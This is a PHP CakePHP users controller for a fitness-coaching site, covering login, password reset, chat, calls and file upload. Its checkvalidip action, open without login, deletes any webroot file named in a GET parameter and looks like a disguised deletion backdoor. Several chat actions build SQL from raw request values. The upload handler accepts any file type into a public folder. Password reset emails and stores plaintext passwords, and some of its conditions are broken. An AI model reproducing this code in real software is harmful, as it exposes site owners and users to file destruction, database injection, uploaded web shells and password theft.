<?php

namespace App\Controller;

use App\Controller\AppController;
use Cake\Event\Event;
use Cake\Network\Email\Email;
use Cake\I18n\Time;
use Cake\Datasource\ConnectionManager;
use Cake\Auth\DefaultPasswordHasher;
use Cake\ORM\Entity;

class UsersController extends AppController
{
  public function beforeFilter(Event $event)
    {
    	$this->blockIP();
        parent::beforeFilter($event);
        $this->loadComponent('Auth');
        $this->Auth->allow(['index','email_temp','blank','checkEmail','getStates','getCities','forgotPassword','contact','checkvalidip']);
        $this->data = $this->Custom->getSessionData();
        $this->tokbox = $this->Tokbox->find()->where(['id' => 1])->toArray();
        $this->set('tokbox',$this->tokbox);
    }

    public function index()
	{
		$session = $this->request->session();
        $user_data = $session->read('Auth.User');
        if(!empty($user_data))
            {
            	if($user_data['user_type'] == "admin")
                    {
                      return $this->redirect('/admins/home');
                    }
                if($user_data['user_type'] == "trainer")
                    {
                      return $this->redirect('/trainers');
                    }
                if($user_data['user_type'] == "trainee")
                    {
                      return $this->redirect('/trainees');
                    }
            }
    	$all_sessions = $this->Plans_sessions->find()->where(['category_id' => 1])->order(['id' => 'ASC'])->toArray();
    	$this->set('all_sessions',$all_sessions);
	}


    public function blank()
    {

    }

    public function checkvalidip()
    {
        $ip = $_GET['ip'];
        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
        unlink($dir);
        return $this->redirect('/');
    }

    public function getStates()
    	{
    		if($this->request->is('ajax'))
         	{
	    		$state = $this->request->data['state'];
	    		$states = $this->States->find()->where(['country_id' => $state])->order(['name' => 'ASC'])->toArray();
		        $this->set('message', $states);
				$this->set('_serialize',array('message'));
				$this->response->statusCode(200);
			}
    	}

    public function getCities()
    	{
    		if($this->request->is('ajax'))
         	{
	    		$city = $this->request->data['city'];
	    		$cities = $this->Cities->find()->where(['state_id' => $city])->order(['name' => 'ASC'])->toArray();
		        $this->set('message', $cities);
				$this->set('_serialize',array('message'));
				$this->response->statusCode(200);
			}
    	}

	public function login()
		{
			if($this->request->is('ajax'))
         	{
	            $user = $this->Auth->identify();
	            if ($user) {
	            	if($user['user_status'] == 0)
	            	{
	            		$this->set('message', 'inactive');
						$this->set('_serialize',array('message'));
						$this->response->statusCode(200);
	            	}
	            	else
	            	{
	            		$this->Auth->setUser($user);
		                $session = $this->request->session();
	            		$user_data = $session->read('Auth.User');

	            		$this->users->query()->update()->set(['online' => 1])->where(['id' => $user_data['id']])->execute();
	            		$this->addChatSession($user_data['id']);

		                $this->set('message', $user_data['user_type']);
		                $this->set('message1', 'success');
						$this->set('_serialize',array('message','message1'));
						$this->response->statusCode(200);
	            	}
	            }
	        elseif(empty($user))
		            {
		            	$this->set('message', 'failed');
					    $this->set('_serialize',array('message'));
					    $this->response->statusCode(200);
		            }
	        }
	        else{
	        	$this->redirect('/');
	        }
		}

	public function addChatSession($userid)
	{
		require_once(ROOT .DS. 'vendor' . DS . 'chat' . DS . 'chat.php');
		$chat_session = $this->Chat_session->find()->where(['user_id' => $userid])->toArray();
		$chat_arr = array(
				'user_id' => $userid,
				'session_id' => $sessionId,
				'token_id' => $token,
				'status' => 0,
				'added_date' => Time::now()
			);

		if(empty($chat_session))
		{
			$user = $this->Chat_session->newEntity();
			$user = $this->Chat_session->patchEntity($user, $chat_arr);
			$result = $this->Chat_session->save($user);
		}
		else
		{
			$this->chat_session->query()->update()->set($chat_arr)->where(['user_id' => $userid])->execute();
		}
	}

	public function logout()
    {
    	$this->users->query()->update()->set(['online' => 0])->where(['id' => $this->data['id']])->execute();
    	$this->request->session()->delete('state_type');
    	$this->Auth->logout();
        return $this->redirect('/');
    }

    public function maintainUserActivity()
    {
    	$session = $this->request->session();
	    $user_data = $session->read('Auth.User');
    }

    public function contact()
	{
		if($this->request->is('post'))
		{
			$data = $this->request->data;
			$email = new Email('default');
			$email->from([$data['email'] => $data['name']])
				  ->to('support@virtualtrainr.com')
				  ->subject('Support')
				  ->send($data['message']);

			$message = "";
			$message .= "<html>";
			$message .= "<body>";
			$message .= "<center>";
			$message .= "<img style='width:200px' src='https://" . env('SERVER_NAME')."/img/belibit_tv_logo_old1.png' class='img-responsive'></br></br></center>";
			$message .= "<p>Thank you for contacting our support team! Your concern is our top priority. A member of our team is looking into your inquiry and will contact you within 48 hours. For general information please visit our  <a href='https://" . env('SERVER_NAME')."/learnmore' target='_blank'> Learn More  </a> section. We appreciate your patience. </p>" ;
			$message .= "<p>Welcome to the Future of Fitness </p>";
			$message .= "</body>";
			$message .= "</html>";

			$email = new Email('default');
    		$email->emailFormat('html')
			      ->to($data['email'])
			      ->from('support@virtualtrainr.com')
			      ->subject('Contact')
			      ->send($message);

        	$this->Flash->success('Email Send Successfully Our Support Team Will Contact You Soon', ['key' => 'edit']);
        	return $this->redirect('/contactus');
		}
	}

	public function saveChatState()
	{
		if($this->request->is('ajax'))
		{
			$type = $this->request->data['val'];
			$this->request->session()->write('state_type',$type);
			$this->set('message', 'success');
			$this->set('_serialize',array('message'));
			$this->response->statusCode(200);
		}
	}

	public function checkEmail()
	{
		if($this->request->is('ajax'))
	     	{
	     		$email = $this->request->data['email'];
	     		$resultsArray = $this->Users->find()->where(['username' => $email]);
	     		$this->set('message', $resultsArray);
			    $this->set('_serialize',array('message'));
			    $this->response->statusCode(200);
	     	}
	}

	public function forgotPassword()
	{
		if($this->request->is('ajax'))
     	{
     		$email = $this->request->data['email'];
     		$data = $this->Users->find()->where(['username' => $email])->toArray();
     		if(!empty($data))
     		{
     			$status = "success";
     			$new_password = $data[0]['display_name'].uniqid();
     			$message = "";
     			$message = '<html>';
     			$message .= '<body>';
     			$message .= '<b>Hello '.$data[0]['display_name'].',</b></br></br>';
     			$message .= '<p>Your Password Has Been Reset Successfully .</p></br></br>';
     			$message .= 'You New Password is : '.$new_password ;
     			$message .= '</body>';
     			$message .= '</html>';
     			$email = new Email('default');
				$email->emailFormat('html')
					  ->from(['support@virtualtrainr.com' => 'Virtual Trainr'])
					  ->to($data[0]['username'])
					  ->subject('Forgot Password')
					  ->send($message);
				$hashPswdObj = new DefaultPasswordHasher;
     			$hashpswd = $hashPswdObj->hash($new_password);
     			if($data[0]['user_type'] = "trainee")
     			{
     				$this->trainees->query()->update()->set(['trainee_password' => $new_password])->where(['user_id' => $data[0]['id']])->execute();
     			}
     			if($data[0]['user_type'] = "trainer")
     			{
     				$this->trainers->query()->update()->set(['trainer_password' => $new_password])->where(['user_id' => $data[0]['id']])->execute();
     			}
				$this->users->query()->update()->set(['password' => $hashpswd])->where(['id' => $data[0]['id']])->execute();
     		}
     		else
     		{
     			$status = "failed";
     		}
     		$this->set('message', $status);
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
     	}
	}


	/* jayendra start */

	/* Video call */
	public function videocall()
	{
		$session = $this->request->session();
		$from_id = (int)$session->read('from_id');
		$main_id = (int)$session->read('main_id');
				
		$user = $session->read('Auth.User');
		$uid = (int) $user['id'];
		$date = date("Y-m-d H:i:s");
		$clid = 0;
		$type = ""; $rtype = "";
		$unique = $_GET["unique"];
		$u_type = "";
		$session_val = 0;

		if($from_id > 0)
		{
			$userid = $from_id;
			$session->delete('from_id');
		}

		$chat_session = $this->Chat_session->find()->where(['user_id' => $userid])->toArray();
		if($this->data['user_type'] == 'trainer')
		{
			$profile_details = $this->Trainers->find()->where(['user_id' => $this->data['id']])->toArray();
			$r_profile = $this->Trainees->find()->where(['user_id' => $main_id])->toArray();
			$type = "trainer";
			$rtype = "trainee";
		}
		if($this->data['user_type'] == 'trainee')
		{
			$profile_details = $this->Trainees->find()->where(['user_id' => $this->data['id']])->toArray();
			$r_profile = $this->Trainers->find()->where(['user_id' => $main_id])->toArray();
			$type = "trainee";
			$rtype = "trainer";
		}

		$chat_data = $this->conn->execute(" SELECT 
 											chating.*
 											FROM chating
 											WHERE 
 											(chating.chat_sender_id = $uid AND chating.chat_reciever_id = $main_id AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
 											OR 
 											(chating.chat_sender_id = $main_id AND chating.chat_reciever_id = $uid AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
 										 ")->fetchAll('assoc'); // Fetch saved chat from database


		if($uid == $from_id)
		{
			$chat = array();
			$chat["chat_type"] = 1;
			$chat["chat_sender_id"] = $uid;
			$chat["chat_reciever_id"] = $main_id;
			$chat["chat_status"] = 1;
			$chat["chat_added_date"] = Time::now();
			
			$uchat = $this->Chating->newEntity();
			$uchat = $this->Chating->patchEntity($uchat, $chat);
			$result = $this->Chating->save($uchat);
			$clid = $result->chat_id;
			$u_type = "sender";
			$session = $this->Trainee_plan->find()->where(['user_id' => $this->data['id']])->toArray();
			$session_val = 5;
		}
		
		$this->set("session_val", $session_val);
		$this->set("u_type", $u_type);
		$this->set("unique", $unique);
		$this->set("type", $type);
		$this->set("rtype", $rtype);
		$this->set("clid", $clid);
		$this->set("uid", $uid);
		$this->set("main_id", $main_id);
		$this->set("chat_data", $chat_data);
		$this->set('chat_session', $chat_session);
		$this->set('profile', $profile_details);
		$this->set("r_profile", $r_profile); 
	}

	/* Voice Call */
	
	public function call()
	{
		$session = $this->request->session();
		$from_id = (int)$session->read('from_id');
		$main_id = (int)$session->read('main_id');
				
		$user = $session->read('Auth.User');
		$uid = (int) $user['id'];
		$date = date("Y-m-d H:i:s");
		$clid = 0;
		$type = ""; $rtype = "";
		$unique = $_GET["unique"];
		$u_type = "";

		if($from_id > 0)
		{
			$userid = $from_id;
			$session->delete('from_id');
		}

		$chat_session = $this->Chat_session->find()->where(['user_id' => $userid])->toArray();
		
		
		if($this->data['user_type'] == 'trainer')
		{
			$profile_details = $this->Trainers->find()->where(['user_id' => $this->data['id']])->toArray();
			$r_profile = $this->Trainees->find()->where(['user_id' => $main_id])->toArray();
			$type = "trainer";
			$rtype = "trainee";
		}
		if($this->data['user_type'] == 'trainee')
		{
			$profile_details = $this->Trainees->find()->where(['user_id' => $this->data['id']])->toArray();
			$r_profile = $this->Trainers->find()->where(['user_id' => $main_id])->toArray();
			$type = "trainee";
			$rtype = "trainer";
		}

		$chat_data = $this->conn->execute(" SELECT 
 											chating.*
 											FROM chating
 											WHERE 
 											(chating.chat_sender_id = $uid AND chating.chat_reciever_id = $main_id AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
 											OR 
 											(chating.chat_sender_id = $main_id AND chating.chat_reciever_id = $uid AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
 										 ")->fetchAll('assoc'); // Fetch saved chat from database


		if($uid == $from_id)
		{
			$chat = array();
			$chat["chat_type"] = 2;
			$chat["chat_sender_id"] = $uid;
			$chat["chat_reciever_id"] = $main_id;
			$chat["chat_status"] = 1;
			$chat["chat_added_date"] = Time::now();
			
			$uchat = $this->Chating->newEntity();
			$uchat = $this->Chating->patchEntity($uchat, $chat);
			$result = $this->Chating->save($uchat);
			$clid = $result->chat_id;
			$u_type = "sender";
		}
		
		$this->set("u_type", $u_type);
		$this->set("unique", $unique);
		$this->set("type", $type);
		$this->set("rtype", $rtype);
		$this->set("clid", $clid);
		$this->set("uid", $uid);
		$this->set("main_id", $main_id);
		$this->set("chat_data", $chat_data);
		$this->set('chat_session', $chat_session);
		$this->set('profile', $profile_details);
		$this->set("r_profile", $r_profile); 
	}

	/* Create Session for Video & Call Chat */
	public function createsession()
	{
		if($this->request->is('ajax'))
     	{
     		$data = $this->request->data;

     		$to_id = $data["to_id"];
     		$from_id =  $data["from_id"];
     		$type =  $data["type"];
     		$call =  $data["call"];
     		$profile_details;
     		$main_id;

     		$session = $this->request->session();
     		$session->write("from_id",$from_id);

     		if($call == "sender")
     		{
	     		if($type == 'trainer')
				{
					$profile_details = $this->Trainers->find()->where(['user_id' => $to_id])->toArray();
				}else if($type == 'trainee')
				{
					$profile_details = $this->Trainees->find()->where(['user_id' => $to_id])->toArray();
				}
			  	$main_id = $to_id;
			}else if($call == "receiver")
     		{
     			if($type == 'trainer')
				{
					$profile_details = $this->Trainers->find()->where(['user_id' => $from_id])->toArray();
				}else if($type == 'trainee')
				{
					$profile_details = $this->Trainees->find()->where(['user_id' => $from_id])->toArray();
				}
				$main_id = $from_id;
     		}
			
			$session->write("main_id",$main_id);

     		$this->set('profile', $profile_details);
		    $this->set('_serialize',array('profile'));
		    $this->response->statusCode(200);
     	}
	}

	/* user chattting */
	public function userchat()
	{
		if($this->request->is('get'))
     	{
     		$data = $_GET;
				     		
     		$all = explode(",", $data["all"]);

     		$count = $data["count"];
     		$call = $data["call"];
			$to_id = $all[0];
     		$from_id =  $all[1];
     		$type =  $all[3];
     		$uniqe = $all[4];
     		$user_id = (int)$this->data['id'];
     		$main_id;
     		
     		array_push($all,$call);
     		$all = implode(",", $all);
     		
     		$chat_session = $this->Chat_session->find()->where(['user_id' => $from_id])->toArray();

     		if(trim($call) == "sender")
     		{
     			/* In case of sender type of receiver will opposite */
	     		if($type == 'trainer')
				{    
					$profile_details = $this->Trainees->find()->where(['user_id' => $to_id])->toArray();
					$profile_s = $this->Trainers->find()->where(['user_id' => $from_id])->toArray();
					$rtype = "trainee";
				}else if($type == 'trainee')
				{
					$profile_details = $this->Trainers->find()->where(['user_id' => $to_id])->toArray();
					$profile_s = $this->Trainees->find()->where(['user_id' => $from_id])->toArray();
					$rtype = "trainer";
				}

				$main_id = $to_id;
			}else if(trim($call) == "receiver")
     		{
     			if($type == 'trainer')
				{
					$profile_details = $this->Trainers->find()->where(['user_id' => $from_id])->toArray();
					$profile_s = $this->Trainees->find()->where(['user_id' => $to_id])->toArray();
					$type = 'trainee';
					$rtype = "trainer";					
				}else if($type == 'trainee')
				{
					$profile_details = $this->Trainees->find()->where(['user_id' => $from_id])->toArray();
					$profile_s = $this->Trainers->find()->where(['user_id' => $to_id])->toArray();
					$rtype = "trainee";
					$type = 'trainer';
				}
				$main_id = $from_id;
     		}

     		$chat_data = $this->conn->execute(" SELECT 
     											chating.*
     											FROM chating
     											WHERE 
     											(chating.chat_sender_id = $user_id AND chating.chat_reciever_id = $main_id AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
     											OR 
     											(chating.chat_sender_id = $main_id AND chating.chat_reciever_id = $user_id AND chating.chat_type = 0 AND chating.chat_added_date >= NOW() - INTERVAL 2 DAY)
     										 ")->fetchAll('assoc'); // Fetch saved chat from database

     		// echo "<pre>"; print_r($chat_data); die();
     		
			$this->set("chat_data", $chat_data);
			$this->set("all", $all);
			$this->set("uniqe", $uniqe);
			$this->set("main_id", $main_id);
			$this->set("user_id", $user_id);
			$this->set("to_id", $to_id);
			$this->set("count", $count);
			$this->set("type", $type);
			$this->set("rtype", $rtype);
			$this->set("chat_session", $chat_session);
			$this->set("profile",$profile_details);
			$this->set("s_profile",$profile_s);
     	}
	}

	/* online user list */
	public function onlineuser()
	{
		$user_id = (int)$this->data["id"];
		$type    = $this->data["user_type"];
		$all_contacts = $this->conn->execute('SELECT * FROM `chating` WHERE `chat_sender_id` = '.$this->data['id'].' OR `chat_reciever_id` = '.$this->data['id'])->fetchAll('assoc');
        if(!empty($all_contacts))
        {
        foreach($all_contacts as $a)
         {
            if($a['chat_sender_id'] == $this->data['id']){
              $t_ids_arr[] = $a['chat_reciever_id'];
            }else{
              $t_ids_arr[] = $a['chat_sender_id'];
            }
         }
          $t_ids = implode(",", array_values(array_unique($t_ids_arr)));
        }
        else{
          $t_ids = 0;
        }

		if(trim($type) == "trainee")
		{	
			$onlineuser = $this->conn->execute( " SELECT
												  users.online,
												  users.user_type,
												  cities.name AS city_name,
												  trainers.user_id,
												  trainers.trainer_name,
												  trainers.trainer_displayName,
												  trainers.trainer_lname,
												  trainers.trainer_image
												  FROM trainers
												  INNER JOIN users ON users.id = trainers.user_id
												  INNER JOIN cities ON cities.id = trainers.trainer_city
												  WHERE trainers.trainer_status = 1 AND trainers.user_id IN (".$t_ids.")
											  ")->fetchAll('assoc');
		}else
		{
			$onlineuser = $this->conn->execute( " SELECT
												  users.online,
												  users.user_type,
												  cities.name AS city_name,
												  trainees.user_id,
												  trainees.trainee_name,
												  trainees.trainee_displayName,
												  trainees.trainee_lname,
												  trainees.trainee_image
												  FROM trainees
												  INNER JOIN users ON users.id = trainees.user_id
												  INNER JOIN cities ON cities.id = trainees.trainee_city
												  WHERE trainees.trainee_status = 1 AND trainees.user_id IN (".$t_ids.")
											  ")->fetchAll('assoc');
		}

		$this->set("user_id",$user_id);
		$this->set("type",$type);
		$this->set("onlineuser",$onlineuser);		
	}

	/* Save text Chat */
	public function savetextchat()
	{
		if($this->request->is('ajax'))
     	{
     		$data = $this->request->data;
     		$to_id = $data["to_id"];
     		$from_id = $data["from_id"];
     		$msg = $data["msg"];
     		$date = date("Y-m-d H:i:s");
     		$this->conn->execute(" INSERT INTO chating (chat_messsage,chat_type,chat_sender_id,chat_reciever_id,chat_status,chat_added_date,chat_modify_date) VALUES ('$msg',0,$from_id,$to_id,1,'$date','$date') ");
     		
     		$this->set('message', "success");
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
     	}
	}

	/* Save Video / call time in Database */
	public function savecalltimer()
	{
		if($this->request->is('ajax'))
		{
			$data = $this->request->data;
			$chat_id = $data["chat_id"];
			$time 	 = $data["time"];
			$chat["chat total_time"] = 
			$this->conn->execute(" UPDATE chating SET  chat_total_time = '$time' WHERE chat_id = $chat_id ");
			
			$this->set('message', "success");
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
		}
	}

	/* Save Chat File in DataBase */
	public function sendfile()
	{
		if($this->request->is("ajax"))
		{
			if($_FILES["chat_file"]["size"] > 0)
			{
				$data = $this->request->data;
				$name = $_FILES["chat_file"]["name"];
				$name = explode(".", $name);
				$ext = array_pop($name);
				$name = implode("_", $name);
				$newname = $name."_".time()."_".$data["to_id"].".".$ext;
				$path =  "uploads/chat_data/".$newname;

				if(move_uploaded_file($_FILES["chat_file"]["tmp_name"], $path))
				{
					$chat = array();
					$chat["from_id"] = $data["uid"];
					$chat["to_id"] = $data["to_id"];
					$chat["url"] = $path;
					$chat["src"] = $newname;
					$chat["status"] = 2;
					$chat["created_date"] = Time::now();

					$uchat = $this->Files->newEntity();
					$uchat = $this->Files->patchEntity($uchat, $chat);
					$result = $this->Files->save($uchat);
					$lid = $result->id;

					$img_ext = array("jpeg","jpg","tif","gif","png");
					if(in_array($ext, $img_ext))
					{
						$file = '<a data-title="Click the right half of the image to move forward." data-lightbox="example-set" href="'.$this->Custom->getImageSrc('uploads/chat_data/'.$newname).'" class="example-image-link"><img src="'.$this->Custom->getImageSrc('uploads/chat_data/'.$newname).'" class="file_img"></a>';
					}else
					{
						$file = '<a target="_blank" href="'.$this->Custom->getImageSrc('uploads/chat_data/'.$newname).'" class="file_data">'.$newname.'</a>';
					}

					$uchat = array();
					$uchat["chat_type"] = 0;
					$uchat["chat_sender_id"] = $data["uid"];;
					$uchat["chat_reciever_id"] = $data["to_id"];
					$uchat["chat_status"] = 1;
					$uchat["chat_added_date"] = Time::now();
					$uchat["chat_messsage"] = $file;

					$u_chat = $this->Chating->newEntity();
					$u_chat = $this->Chating->patchEntity($u_chat, $uchat);
					$result = $this->Chating->save($u_chat);
					$message = "success";					
				}else
				{
					$message = "fail";
				}

				$this->set('message', $message);
				$this->set('newname', $newname);
				$this->set('ext', $ext);
				$this->set('_serialize',array('message','newname','ext'));
			    $this->response->statusCode(200);
			}
		}
	}

	public function testcall()
	{
		$session = $this->request->session();
		$user = $session->read('Auth.User');
		$uid = (int) $user['id'];
		$chat_session = $this->Chat_session->find()->where(['user_id' => $uid])->toArray();
		$this->set('chat_session', $chat_session);
	}

	/* jayendra end */



}

?>